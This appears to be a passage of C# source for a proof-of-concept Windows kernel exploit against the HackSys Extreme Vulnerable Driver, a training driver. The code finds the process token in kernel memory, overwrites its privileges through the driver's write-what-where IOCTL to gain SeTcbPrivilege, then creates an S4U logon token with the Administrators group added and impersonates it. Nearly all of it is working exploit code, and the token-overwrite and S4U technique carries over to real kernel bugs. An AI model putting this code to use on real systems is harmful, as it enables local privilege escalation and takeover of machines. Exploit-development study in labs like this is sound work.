            UNDOCK = 0x0000000002000000UL, // SeUndockPrivilege
            SYNC_AGENT = 0x0000000004000000UL, // SeSyncAgentPrivilege
            ENABLE_DELEGATION = 0x0000000008000000UL, // SeEnableDelegationPrivilege
            MANAGE_VOLUME = 0x0000000010000000UL, // SeManageVolumePrivilege
            IMPERSONATE = 0x0000000020000000UL, // SeImpersonatePrivilege
            CREATE_GLOBAL = 0x0000000040000000UL, // SeCreateGlobalPrivilege
            TRUSTED_CREDMAN_ACCESS = 0x0000000080000000UL, // SeTrustedCredManAccessPrivilege
            RELABEL = 0x0000000100000000UL, // SeRelabelPrivilege
            INCREASE_WORKING_SET = 0x0000000200000000UL, // SeIncreaseWorkingSetPrivilege
            TIME_ZONE = 0x0000000400000000UL, // SeTimeZonePrivilege
            CREATE_SYMBOLIC_LINK = 0x0000000800000000UL, // SeCreateSymbolicLinkPrivilege
            DELEGATE_SESSION_USER_IMPERSONATE = 0x0000001000000000UL, // SeDelegateSessionUserImpersonatePrivilege
            ALL = 0x0000001FFFFFFFFCUL
        }

        // User define functions
        static bool AdjustTokenIntegrityLevel(IntPtr hToken)
        {
            NTSTATUS ntstatus;
            IntPtr pDataBuffer;
            var nDataSize = (uint)Marshal.SizeOf(typeof(TOKEN_MANDATORY_LABEL));
            var status = false;

            do
            {
                pDataBuffer = Marshal.AllocHGlobal((int)nDataSize);
                ntstatus = NtQueryInformationToken(
                    WindowsIdentity.GetCurrent().Token,
                    TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                    pDataBuffer,
                    nDataSize,
                    out nDataSize);

                if (ntstatus != STATUS_SUCCESS)
                    Marshal.FreeHGlobal(pDataBuffer);
            } while (ntstatus == STATUS_BUFFER_TOO_SMALL);

            if (ntstatus == STATUS_SUCCESS)
            {
                ntstatus = NtSetInformationToken(
                    hToken,
                    TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                    pDataBuffer,
                    nDataSize);
                status = (ntstatus == STATUS_SUCCESS);
                Marshal.FreeHGlobal(pDataBuffer);
            }

            return status;
        }


        static bool CompareIgnoreCase(string strA, string strB)
        {
            return (string.Compare(strA, strB, StringComparison.OrdinalIgnoreCase) == 0);
        }


        static bool ConvertSidToAccountName(
            IntPtr pSid,
            out string accountName,
            out string domainName,
            out SID_NAME_USE sidType)
        {
            int nAccountNameLength = 255;
            int nDomainNameLength = 255;
            var accountNameBuilder = new StringBuilder(nAccountNameLength);
            var domainNameBuilder = new StringBuilder(nDomainNameLength);
            bool status = LookupAccountSid(
                null,
                pSid,
                accountNameBuilder,
                ref nAccountNameLength,
                domainNameBuilder,
                ref nDomainNameLength,
                out sidType);

            if (status)
            {
                accountName = accountNameBuilder.ToString();
                domainName = domainNameBuilder.ToString();
            }
            else
            {
                accountName = null;
                domainName = null;
                sidType = SID_NAME_USE.SidTypeUnknown;
            }

            return status;
        }


        static string GetCurrentDomainName()
        {
            bool status;
            int nNameLength = 255;
            string domainName = Environment.UserDomainName;
            var nameBuilder = new StringBuilder(nNameLength);

            do
            {
                status = GetComputerNameEx(
                    COMPUTER_NAME_FORMAT.ComputerNameDnsDomain,
                    nameBuilder,
                    ref nNameLength);

                if (!status)
                {
                    nameBuilder.Clear();
                    nameBuilder.Capacity = nNameLength;
                }
            } while (Marshal.GetLastWin32Error() == ERROR_MORE_DATA);

            if (status && (nNameLength > 0))
                domainName = nameBuilder.ToString();

            return domainName;
        }


        static IntPtr GetCurrentProcessTokenPointer()
        {
            int ntstatus;
            IntPtr pInfoBuffer;
            uint nInfoLength = 1024;
            IntPtr hToken = WindowsIdentity.GetCurrent().Token;
            var pObject = IntPtr.Zero;

            do
            {
                pInfoBuffer = Marshal.AllocHGlobal((int)nInfoLength);
                ntstatus = NtQuerySystemInformation(
                    SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation,
                    pInfoBuffer,
                    nInfoLength,
                    out nInfoLength);

                if (ntstatus != STATUS_SUCCESS)
                    Marshal.FreeHGlobal(pInfoBuffer);
            } while (ntstatus == STATUS_INFO_LENGTH_MISMATCH);

            if (ntstatus == STATUS_SUCCESS)
            {
                var nEntryCount = Marshal.ReadInt32(pInfoBuffer);
                var pid = Process.GetCurrentProcess().Id;
                var nEntrySize = Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));

                for (var idx = 0; idx < nEntryCount; idx++)
                {
                    IntPtr pEntryBuffer;

                    if (Environment.Is64BitProcess)
                        pEntryBuffer = new IntPtr(pInfoBuffer.ToInt64() + (IntPtr.Size * 2) + (nEntrySize * idx));
                    else
                        pEntryBuffer = new IntPtr(pInfoBuffer.ToInt32() + (IntPtr.Size * 2) + (nEntrySize * idx));

                    var entry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(
                        pEntryBuffer,
                        typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));

                    if ((entry.UniqueProcessId == new IntPtr(pid)) &&
                        (entry.HandleValue == hToken))
                    {
                        pObject = entry.Object;
                        break;
                    }
                }

                Marshal.FreeHGlobal(pInfoBuffer);
            }

            return pObject;
        }


        static bool GetLocalAccounts(out Dictionary<string, bool> localAccounts)
        {
            bool status;
            int error;
            int nEntrySize = Marshal.SizeOf(typeof(USER_INFO_1));
            int nMaximumLength = nEntrySize * 0x100;
            localAccounts = new Dictionary<string, bool>();

            error = NetUserEnum(
                null,
                1,
                USER_INFO_FILTER.NORMAL_ACCOUNT,
                out IntPtr pDataBuffer,
                nMaximumLength,
                out int nEntries,
                out int _,
                IntPtr.Zero);
            status = (error == ERROR_SUCCESS);

            if (status)
            {
                IntPtr pEntry;
                bool available;

                for (var idx = 0; idx < nEntries; idx++)
                {
                    if (Environment.Is64BitProcess)
                        pEntry = new IntPtr(pDataBuffer.ToInt64() + (idx * nEntrySize));
                    else
                        pEntry = new IntPtr(pDataBuffer.ToInt32() + (idx * nEntrySize));

                    var entry = (USER_INFO_1)Marshal.PtrToStructure(pEntry, typeof(USER_INFO_1));
                    available = !((entry.usri1_flags & (USER_FLAGS.UF_ACCOUNTDISABLE | USER_FLAGS.UF_LOCKOUT)) != 0);
                    localAccounts.Add(entry.usri1_name, available);
                }

                NetApiBufferFree(pDataBuffer);
            }

            return status;
        }


        static bool GetS4uLogonAccount(
            out string upn,
            out string domain,
            out LSA_STRING pkgName,
            out TOKEN_SOURCE tokenSource)
        {
            bool status = GetLocalAccounts(out Dictionary<string, bool> localAccounts);
            upn = null;
            domain = null;
            pkgName = new LSA_STRING();
            tokenSource = new TOKEN_SOURCE();

            if (status)
            {
                foreach (var account in localAccounts)
                {
                    if (account.Value)
                    {
                        upn = account.Key;
                        domain = Environment.MachineName;
                        pkgName = new LSA_STRING(MSV1_0_PACKAGE_NAME);
                        tokenSource = new TOKEN_SOURCE("User32");
                        break;
                    }
                }

                if (string.IsNullOrEmpty(upn))
                {
                    var fqdn = GetCurrentDomainName();

                    if (!CompareIgnoreCase(fqdn, Environment.MachineName))
                    {
                        upn = Environment.UserName;
                        domain = fqdn;
                        pkgName = new LSA_STRING(NEGOSSP_NAME);
                        tokenSource = new TOKEN_SOURCE("NtLmSsp");
                    }
                    else
                    {
                        status = false;
                    }
                }
            }

            return status;
        }


        static IntPtr GetS4uLogonToken(
            string upn,
            string domain,
            in LSA_STRING pkgName,
            in TOKEN_SOURCE tokenSource,
            List<string> localGroupSids)
        {
            var hS4uLogonToken = IntPtr.Zero;

            do
            {
                IntPtr pTokenGroups;
                int nGroupCount = localGroupSids.Count;
                var nGroupsOffset = Marshal.OffsetOf(typeof(TOKEN_GROUPS), "Groups").ToInt32();
                var nTokenGroupsSize = nGroupsOffset;
                var pSidBuffersToLocalFree = new List<IntPtr>();
                nTokenGroupsSize += (Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES)) * nGroupCount);

                NTSTATUS ntstatus = LsaConnectUntrusted(out IntPtr hLsa);

                if (ntstatus != STATUS_SUCCESS)
                {
                    SetLastError(LsaNtStatusToWinError(ntstatus));
                    break;
                }

                ntstatus = LsaLookupAuthenticationPackage(hLsa, in pkgName, out uint authnPkg);

                if (ntstatus != STATUS_SUCCESS)
                {
                    LsaClose(hLsa);
                    SetLastError(LsaNtStatusToWinError(ntstatus));
                    break;
                }

                if (nGroupCount > 0)
                {
                    int nUnitSize = Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES));
                    var attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
                    pTokenGroups = Marshal.AllocHGlobal(nTokenGroupsSize);
                    nGroupCount = 0;
                    ZeroMemory(pTokenGroups, nTokenGroupsSize);

                    foreach (var stringSid in localGroupSids)
                    {
                        if (ConvertStringSidToSid(stringSid, out IntPtr pSid))
                        {
                            ConvertSidToAccountName(pSid, out string _, out string _, out SID_NAME_USE sidType);

                            if ((sidType == SID_NAME_USE.SidTypeAlias) ||
                                (sidType == SID_NAME_USE.SidTypeWellKnownGroup))
                            {
                                Marshal.WriteIntPtr(pTokenGroups, (nGroupsOffset + (nGroupCount * nUnitSize)), pSid);
                                Marshal.WriteInt32(pTokenGroups, (nGroupsOffset + (nGroupCount * nUnitSize) + IntPtr.Size), attributes);
                                pSidBuffersToLocalFree.Add(pSid);
                                nGroupCount++;
                            }
                        }
                    }

                    if (nGroupCount == 0)
                    {
                        Marshal.FreeHGlobal(pTokenGroups);
                        pTokenGroups = IntPtr.Zero;
                    }
                    else
                    {
                        Marshal.WriteInt32(pTokenGroups, nGroupCount);
                    }
                }
                else
                {
                    pTokenGroups = IntPtr.Zero;
                }

                using (var msv = new MSV1_0_S4U_LOGON(MSV1_0_LOGON_SUBMIT_TYPE.MsV1_0S4ULogon, 0, upn, domain))
                {
                    IntPtr pTokenBuffer = Marshal.AllocHGlobal(IntPtr.Size);
                    var originName = new LSA_STRING("S4U");
                    ntstatus = LsaLogonUser(
                        hLsa,
                        in originName,
                        SECURITY_LOGON_TYPE.Network,
                        authnPkg,
                        msv.Buffer,
                        (uint)msv.Length,
                        pTokenGroups,
                        in tokenSource,
                        out IntPtr ProfileBuffer,
                        out uint _,
                        out LUID _,
                        pTokenBuffer,
                        out QUOTA_LIMITS _,
                        out NTSTATUS _);
                    LsaFreeReturnBuffer(ProfileBuffer);
                    LsaClose(hLsa);

                    if (ntstatus != STATUS_SUCCESS)
                        SetLastError(LsaNtStatusToWinError(ntstatus));
                    else
                        hS4uLogonToken = Marshal.ReadIntPtr(pTokenBuffer);

                    Marshal.FreeHGlobal(pTokenBuffer);
                }

                if (pTokenGroups != IntPtr.Zero)
                    Marshal.FreeHGlobal(pTokenGroups);

                foreach (var pSidBuffer in pSidBuffersToLocalFree)
                    LocalFree(pSidBuffer);
            } while (false);

            return hS4uLogonToken;
        }


        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            int nReturnedLength;
            int nSizeMesssage = 256;
            var message = new StringBuilder(nSizeMesssage);
            var dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            var pNtdll = IntPtr.Zero;

            if (isNtStatus)
            {
                foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
                {
                    if (CompareIgnoreCase(Path.GetFileName(module.FileName), "ntdll.dll"))
                    {
                        pNtdll = module.BaseAddress;
                        dwFlags |= FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE;
                        break;
                    }
                }
            }

            nReturnedLength = FormatMessage(
                dwFlags,
                pNtdll,
                code,
                0,
                message,
                nSizeMesssage,
                IntPtr.Zero);

            if (nReturnedLength == 0)
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            else
                return string.Format("[ERROR] Code 0x{0} : {1}", code.ToString("X8"), message.ToString().Trim());
        }


        static bool ImpersonateThreadToken(IntPtr hImpersonationToken)
        {
            IntPtr pImpersonationLevel = Marshal.AllocHGlobal(4);
            bool status = ImpersonateLoggedOnUser(hImpersonationToken);

            if (status)
            {
                NTSTATUS ntstatus = NtQueryInformationToken(
                    WindowsIdentity.GetCurrent().Token,
                    TOKEN_INFORMATION_CLASS.TokenImpersonationLevel,
                    pImpersonationLevel,
                    4u,
                    out uint _);
                status = (ntstatus == STATUS_SUCCESS);

                if (status)
                {
                    var level = (SECURITY_IMPERSONATION_LEVEL)Marshal.ReadInt32(pImpersonationLevel);

                    if (level == SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation)
                        status = true;
                    else if (level == SECURITY_IMPERSONATION_LEVEL.SecurityDelegation)
                        status = true;
                    else
                        status = false;
                }
            }

            Marshal.FreeHGlobal(pImpersonationLevel);

            return status;
        }


        static bool OverwriteTokenPrivileges(IntPtr hDevice, IntPtr tokenPointer, ulong privValue)
        {
            IntPtr pParent = new IntPtr(tokenPointer.ToInt64() + 0x40);
            IntPtr pEnabled = new IntPtr(tokenPointer.ToInt64() + 0x48);
            bool status = WritePointer(hDevice, pParent, new IntPtr((long)privValue));

            if (status)
                status = WritePointer(hDevice, pEnabled, new IntPtr((long)privValue));

            return status;
        }


        static bool WritePointer(IntPtr hDevice, IntPtr pWhere, IntPtr pWhatToWrite)
        {
            bool status;
            IntPtr pInputBuffer = Marshal.AllocHGlobal(IntPtr.Size * 2);
            IntPtr pWhatBuffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(pWhatBuffer, pWhatToWrite);
            Marshal.WriteIntPtr(pInputBuffer, pWhatBuffer); // what
            Marshal.WriteIntPtr(pInputBuffer, IntPtr.Size, pWhere); // where

            status = DeviceIoControl(
                hDevice,
                0x22200B,
                pInputBuffer,
                (IntPtr.Size * 2),
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                IntPtr.Zero);

            Marshal.FreeHGlobal(pWhatBuffer);
            Marshal.FreeHGlobal(pInputBuffer);

            return status;
        }


        static void ZeroMemory(IntPtr pBuffer, int nLength)
        {
            for (var offset = 0; offset < nLength; offset++)
                Marshal.WriteByte(pBuffer, offset, 0);
        }


        static void Main()
        {
            Console.WriteLine("--[ HEVD Kernel Write PoC : SeTcbPrivilege - S4U Logon\n");

            if (!Environment.Is64BitOperatingSystem)
            {
                Console.WriteLine("[!] 32 bit OS is not supported.\n");
                return;
            }
            else if (IntPtr.Size != 8)
            {
                Console.WriteLine("[!] Should be built with 64 bit pointer.\n");
                return;
            }

            Console.WriteLine("[*] Current account is \"{0}\\{1}\"", Environment.UserDomainName, Environment.UserName);
            Console.WriteLine("[>] Trying to find token address for this process.");

            IntPtr pCurrentToken = GetCurrentProcessTokenPointer();

            if (pCurrentToken == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to find nt!_TOKEN.");
                return;
            }
            else
            {
                Console.WriteLine("[+] nt!_TOKEN for this process @ 0x{0}", pCurrentToken.ToString("X16"));
            }

            do
            {
                bool status;
                IntPtr hS4uImpersonateToken;
                string deviceName = @"\\.\HacksysExtremeVulnerableDriver";
                var extraGroups = new List<string> {
                    "S-1-5-20",    // NT AUTHORITY\NETWORK SERVICE
                    "S-1-5-32-544" // BUILTIN\Administrators
                };

                Console.WriteLine("[>] Trying to open device driver.");
                Console.WriteLine("    [*] Device Path : {0}", deviceName);

                IntPtr hDevice = CreateFile(
                    deviceName,
                    FileAccess.ReadWrite,
                    FileShare.ReadWrite,
                    IntPtr.Zero,
                    FileMode.Open,
                    FileAttributes.Normal,
                    IntPtr.Zero);

                if (hDevice == INVALID_HANDLE_VALUE)
                {
                    Console.WriteLine("[-] Failed to open {0}", deviceName);
                    Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got driver handle (Handle = 0x{0}).", hDevice.ToString("X"));
                }

                Console.WriteLine("[>] Trying to overwrite token.");

                status = OverwriteTokenPrivileges(hDevice, pCurrentToken, (ulong)SepTokenPrivilegesFlags.TCB);
                CloseHandle(hDevice);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to overwrite token privileges.");
                    Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Token privileges are overwritten successfully.");
                }

                Console.WriteLine("[>] Trying to S4U logon.");

                if (GetS4uLogonAccount(
                    out string upn,
                    out string domain,
                    out LSA_STRING pkgName,
                    out TOKEN_SOURCE tokenSource))
                {
                    Console.WriteLine(@"    [*] Account Name : {0}\{1}", domain, upn);
                }
                else
                {
                    Console.WriteLine("[-] Failed to determin account information for S4U logon.");
                    break;
                }

                hS4uImpersonateToken = GetS4uLogonToken(upn, domain, in pkgName, in tokenSource, extraGroups);

                if (hS4uImpersonateToken == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to create S4U logon tokens.");
                    Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] S4U logon tokens are created successfully.");
                }

                if (!AdjustTokenIntegrityLevel(hS4uImpersonateToken))
                {
                    Console.WriteLine("[-] Failed to adjust token integrity level.");
                    CloseHandle(hS4uImpersonateToken);
                    break;
                }

                status = ImpersonateThreadToken(hS4uImpersonateToken);
                CloseHandle(hS4uImpersonateToken);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to S4U logon.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Exploit is successful. Check this thread token groups with TokenViewer.");
                    Console.WriteLine("    \"NT AUTHORITY\\NETWORK SERVICE\" should be added to token groups.");
                    Console.WriteLine("[*] To exit this program, hit [ENTER] key or raise keyboad interrupption.");
                    Console.ReadLine();
                }
            } while (false);
        }
    }
}